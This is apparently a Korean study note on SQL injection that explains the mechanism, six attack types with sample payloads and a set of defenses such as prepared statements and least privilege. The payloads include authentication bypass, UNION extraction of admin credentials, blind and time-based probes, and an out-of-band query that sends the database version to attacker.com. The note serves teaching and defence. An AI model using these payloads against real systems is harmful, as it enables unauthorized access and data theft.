## 💉 SQL Injection 이란?

---

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c33fee58-8f40-4523-b222-c56099de30a9/67fb4ea2-d30b-40b1-8ff9-8de7eee76f6e/Untitled.png)

---

**“SQL Injection”**은 DB 시스템에 대한 보안 취약점을 이용한 공격 방법 중 하나이다.

공격자는 애플리케이션의 보안 취약점을 통해 악의적인 SQL 문을 DB 시스템에 **주입(Injection)**하고 실행한다.

- 이를 통해 DB에 저장된 정보를 무단으로 조회, 수정, 삭제하는 등의 행위를 할 수 있다.

<aside>
📌 ***SQL Injection은 말 그대로 특정 SQL 문으로 해커가 원하는 DB 정보를 가져오는 해킹 기법이다.***

</aside>

## 🎥 SQL Injection 원리와 동작 과정

---

웹 애플리케이션에서 사용자 입력을 적절히 검증하거나 필터링하지 않고 SQL 문에 직접 삽입할 경우, SQL Injection 공격이라는 보안 취약점으로 이어질 수 있다.

- 이러한 공격은 애플리케이션의 DB에 무단으로 접근 및 조작을 해서, 심각한 보안 문제를 야기할 수 있다.

예를 들어, 로그인 폼에서 사용자는 자신의 사용자 이름과 비밀번호를 입력한다고 가정하자.

이때, 웹 애플리케이션은 다음과 같은 SQL 문을 실행하여 사용자 인증을 처리하게 된다.

```sql
SELECT * 
FROM users 
WHERE username = '입력받은_사용자이름' AND password = '입력받은_비밀번호';
```

---

이 과정에서 공격자가 사용자 이름 입력란에 특별히 조작된 값을 입력한다고 가정해보자.

예를 들어, 공격자가 사용자 이름란에 ***‘ OR 1 = 1 --*** 을 입력하면, 서버가 처리하는 최종 SQL 문은 다음과 같다.

```sql
SELECT * 
FROM users 
WHERE username = '' OR 1=1--' AND password = '입력된 비밀번호';
```

---

여기서 `*‘ ‘*` 공백이나 `*‘1’ = ‘1’*`은 항상 TRUE를 의미하고, *`--`*는 한 줄 주석을 의미한다.

즉, 이 조건은 언제나 만족되므로, SQL 문은 비밀번호의 정확성과 관계없이 모든 사용자의 정보를 반환하게 된다.

또한, AND password = ‘입력된 비밀번호’ 부분이 주석 처리되어 실행되지 않는다.

이는 공격자가 인증 과정을 우회하고, 경우에 따라 DB의 중요 정보에 접근할 수 있는 심각한 보안 취약점이다.

## 🛡️ SQL Injection 공격 종류 및 방법

---

SQL Injection 공격은 다양한 방식이 존재하며, 각각의 방식은 웹 애플리케이션의 특정 취약점을 이용한다.

### Error-Based(오류 기반) SQL Injection

---

오류 기반은 공격자가 **DB 쿼리를 의도적으로 실패**시켜, 발생하는 **DB 오류 메시지**를 통해 정보를 얻는 기법이다.

- DB 오류 메시지들은 때때로 DB의 구조, 테이블 이름, 민감한 데이터 등을 포함할 수 있다.
- 또한 공격자는 이 정보들을 이용해서 추가적인 공격을 계획할 수 있다.

예를 들어, DB가 MySQL인 경우, 공격자는 다음과 같이 입력할 수 있다.

```sql
' UNION SELECT 1,@@version -- 
```

---

공격자 목표는 *@@version*을 통해 **DB의 버전 정보를 얻고,** 이는 **오류 메시지 혹은 결과 집합으로 반환**될 수 있다.

- 공격자는 정보를 바탕으로 DB의 취약점을 더욱 정밀하게 공격할 수 있는 추가 정보를 수집할 수 있다.
- 예를 들어, 해당 DB 버전이 알려진 취약점을 가지고 있다면, 그 취약점을 이용한 공격을 시도할 수 있다.

### Inline Comment(주석) SQL Injection

---

공격자는 SQL 문 내에 **주석**을 삽입하여 원래 SQL 문을 수정하거나 특정 부분을 무력화시킬 수 있다.

이 방법을 통해 공격자는 **추가적인 SQL 문을 삽입**하거나, 원래 쿼리 일부를 **주석 처리**하여 무시되게 만들 수 있다.

예를 들어, --(더블 대시 공백) 방식을 이용해 라인의 나머지 부분을 주석 처리할 수 있다.

```sql
SELECT * FROM users WHERE username = 'admin' -- AND password = 'secret';
```

---

해당 방식은 -- 뒤에 AND password = ‘secret’; 부분을 주석 처리하여 실행되지 않는다.

따라서 해당 쿼리는 비밀번호 일치 여부와 관계 없이 username이 ‘admin’인 모든 사용자를 선택한다.

또 다른 예시는 # 기호를 사용하여 이후 텍스트가 줄 끝까지 주석 처리할 수 있다.

```sql
SELECT * FROM users WHERE username = 'admin' # AND password = 'secret';
```

---

해당 방식은 # 기호 뒤에 AND password = ‘secret’; 부분을 주석 처리하여 실행되지 않는다.

결과적으로 해당 쿼리 역시 username이 ‘admin’인 모든 사용자를 선택한다.

### Union(유니온) SQL Injection

---

유니온 기반은 공격자가 **두 개 이상의 SELECT문을 UNION 명령어를 사용하여 결합**할 때 발생한다.

- 이를 통해 공격자는 원래 쿼리 결과에 추가적인 데이터를 삽입할 수 있다.

예를 들어, 어떤 웹 애플리케이션이 사용자 입력을 통해 다음과 같은 쿼리를 실행한다고 가정해보자.

```sql
SELECT account, password FROM users WHERE account = '$user_input';
```

---

만약, 공격자가 **$user_input** 에 다음과 같은 값을 입력한다면

```sql
' UNION SELECT username, password FROM admin_users --
```

---

완성된 쿼리는 다음과 같이 작성된다.

```sql
SELECT account, password 
FROM users 
WHERE account = '' 
UNION SELECT username, password 
			FROM admin_users --';
```

---

- 해당 쿼리는 users 테이블에서 account 컬럼과 password 컬럼을 선택하고,
- admin_users 테이블에서 username과 password를 추가로 선택한다.
- -- 는 이후의 쿼리 부분을 주석 처리하여 원래 쿼리의 나머지 부분을 무시하게 된다.

### Blind(불린 기반) SQL Injection

---

불린 기반은 **SQL 질의 조건을 조작**해, 애플리케이션이 어떤 식으로 **반응하는지 관찰**해서 DB 정보를 추론한다.

즉, 공격자가 DB로부터 직접적인 정보를 얻지 않고, 참 혹은 거짓의 결과를 통해 데이터를 유추하는 방식이다.

예를 들어, 공격자는 특정 조건이 참인지 거짓인지에 따라 웹 페이지의 반응을 관찰함으로써, DB 구조나 내용을 점진적으로 파악할 수 있다.

또 다른 예시로 다음과 같은 쿼리가 있다고 가정하자.

```sql
SELECT * FROM products WHERE product_id = '$user_input';
```

---

공격자가 **$user_input** 에 다음과 같은 값을 입력할 수 있다.

```sql
1' AND (SELECT SUBSTRING(version(),1,1)) = '5' --
```

---

공격자는 MySQL 버전이 5.x 인지 확인할 수 있고, 다양한 조건을 통해 시스템 정보를 점진적으로 얻을 수 있다.

### Time-Based(시간 기반) SQL Injection

---

공격자는 특정 **SQL 쿼리의 실행 시간을 조작**함으로써 정보를 얻을 수 있는 방법을 사용한다.

예를 들어, SLEEP(5)과 같은 명령을 삽입하여, 쿼리 실행에 5초의 지연이 발생하게 만들 수 있다.

- 이를 통해 참 혹은 거짓의 결과를 시간 지연을 통해 간접적으로 얻을 수 있다.

```sql
SELECT * FROM users WHERE username = '$user_input';
```

---

공격자가 **$user_input** 에 다음과 같은 값을 입력할 수 있다.

```sql
admin' AND IF(1=1, SLEEP(5), 'false') --
```

---

해당 경우 조건이 참이므로 DB는 5초 동안 대기하게 된다.

### Out-of-Band SQL Injection

---

아웃 오브 밴드 공격은 주로 **DB 서버가 공격자의 서버로 직접 데이터를 전송**하도록 만드는 기법이다.

이를 위해 공격자는 DB 쿼리 내에서 DNS 조회, HTTP 요청 등을 발생시킬 수 있는 SQL 함수를 사용할 수 있다.

예를 들어, 공격자가 다음과 같은 쿼리를 주입할 수 있다.

```sql
SELECT LOAD_FILE(concat('\\\\',(SELECT @@version),'\\.attacker.com\\abc'));
```

---

해당 쿼리에서 LOAD_FILE 함수와 concat 함수를 사용하여 공격자의 도메인으로 MySQL 버전 정보를 포함하는 DNS 조회를 생성한다.

## ⛑️ SQL Injection 대응 방안

---

SQL Injection은 악의적인 사용자가 외부에서 SQL 명령을 주입하여 DB를 조작하려고 시도하는 공격 기법이다.

따라서 이러한 SQL 삽입 공격을 방지하기 위한 대응 방안은 다음과 같다.

### 1. PreparedStatement 사용

---

```java
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement statement = connection.prepareStatement(sql);
statement.setString(1, username);
statement.setString(2, password);
ResultSet resultSet = statement.executeQuery();
```

---

PreparedStatement는 SQL 쿼리 실행 전 쿼리 구조를 미리 컴파일하고, 실행 시점에 파라미터를 전달한다.

- 사용자 입력 값을 쿼리의 일부로 직접 결합하지 않기 때문에 SQL 삽입 공격을 방지할 수 있다.

### 2. ORM 사용

---

ORM(객체 관계 매핑) 프레임워크는 SQL 쿼리를 직접 작성하는 대신 객체 메소드를 통해 데이터를 관리해준다.

예를 들어, Hibernate와 같은 ORM 프레임워크는 자동으로 SQL 쿼리를 생성하고, SQL 삽입을 방지해준다.

### 3. 사용자 입력 검증

---

사용자로부터 받은 입력 값에 대한 검증은 SQL 삽입 공격을 방지하는 데 필수적이다.

때문에 특수 문자, SQL 키워드 등 의심스러운 입력 값에 대해 검증하고 필터링하여 공격을 사전에 차단해야 한다.

### 4. 데이터베이스 접근 제한

---

DB 사용자에게 최소한의 권한만 부여해서 공격자가 SQL 삽입으로 데이터 수정 및 삭제 행위를 제한할 수 있다.

예를 들어, 조회만 필요한 기능에 대해서는 SELECT 권한만 부여한다.

### 5. 오류 메시지 관리

---

SQL 삽입 공격 시도 중 발생할 수 있는 DB 오류 메시지는 공격자에게 유용한 정보를 제공할 수 있다.

따라서 사용자에게 구체적인 DB 오류 메시지를 노출하는 것이 아닌, 일반적인 오류 메시지를 반환하도록 한다.

### 6. 웹 애플리케이션 방화벽 사용

---

WAF(웹 애플리케이션 방화벽)는 들어오는 요청을 모니터링하고, SQL 삽입과 같은 공격 시도를 차단해준다.